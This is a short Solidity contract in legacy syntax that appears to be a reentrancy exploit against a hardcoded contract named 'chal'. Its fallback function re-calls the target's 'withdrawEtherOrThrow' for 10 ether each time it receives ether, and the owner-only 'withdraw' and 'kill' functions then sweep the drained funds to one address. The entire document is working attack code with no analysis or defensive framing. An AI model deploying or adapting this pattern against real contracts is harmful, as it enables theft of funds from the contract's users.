1 contract chal2sweep {
2     address chal = 0x08d698358b31ca6926e329879db9525504802abf;
3     address noel = 0x1488e30b386903964b2797c97c9a3a678cf28eca;
4 
5     // restrict msg.sender
6     modifier only_noel { if (msg.sender == noel) _ }
7     // don't run recursively
8     modifier msg_value_not(uint _amount) {
9         if (msg.value != _amount) _
10     }
11 
12     // could use kill() straight-up, but want to test gas on live chain
13     function withdraw(uint _amount) only_noel {
14         if (!noel.send(_amount)) throw;
15     }
16 
17     // should allow withdrawal without gas calc
18     function kill() only_noel {
19         suicide(noel);
20     }
21 
22     // web3.toWei(10, "ether") == "10000000000000000000"
23     function () msg_value_not(10000000000000000000) {
24         if (!chal.call("withdrawEtherOrThrow", 10000000000000000000))
25             throw;
26     }
27 }